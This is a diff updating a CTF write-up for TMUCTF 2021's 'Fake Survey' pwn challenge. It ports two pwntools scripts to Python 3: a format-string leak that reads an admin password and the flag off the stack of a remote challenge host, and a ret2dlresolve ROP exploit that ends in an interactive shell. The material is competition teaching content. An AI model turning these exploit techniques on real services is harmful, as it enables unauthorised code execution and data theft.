@@ -12,27 +12,30 @@ import pwn
 import time
 
 i = 1
-l = []
-while(i != 15):
-    r = pwn.remote('185.235.41.205', 7050)
+a = []
+while i != 15:
+    r = pwn.remote("185.235.41.205", 7050)
     p = "%" + str(i) + "$p"
-    r.sendline(p)
+    r.sendline(p.encode())
     r.recvlines(21)
-    adminPass = r.recvline().split(" ")[-1]
-    print(adminPass)
-    l.append(adminPass)
-    i = i + 1
-pl = []
-for k in l:
+    admin_pass = r.recvline().decode().split(" ")[-1]
+    print(admin_pass)
+    a.append(admin_pass)
+    i += 1
+
+flag = []
+for k in a:
     try:
-        pl.append(pwn.p32(int(k, 16)))
+        flag.append(pwn.p32(int(k, 16)).decode("latin-1"))
     except Exception as e:
         pass
-print("".join(pl))
+
+print("".join(flag))
 ```   
 And for `return to dl_resove` I used `Ret2dlresolvePayload` class of `pwntools`. Here is its script (also available in [solve_step2.py](https://github.com/TMUCTF/TMUCTF-2021/blob/main/Pwn/Fake%20Survey/Writeup%20Files/solve_step2.py)):  
 ```python
 from pwn import *
+
 context.binary = elf = ELF('./fakesurvey')
 
 rop = ROP(context.binary)
@@ -41,9 +44,9 @@ rop.read(0, dlresolve.data_addr)
 rop.ret2dlresolve(dlresolve)
 raw_rop = rop.chain()
 
-p = remote('185.235.41.205', 7050)
-p.sendline("CPRSyRMOFa3FVIF")
-p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
+p = remote("185.235.41.205", 7050)
+p.sendline("CPRSyRMOFa3FVIF".encode())
+p.sendline(fit({64 + context.bytes * 3: raw_rop, 200: dlresolve.payload}))
 p.interactive()
 ```   
 The flag:   
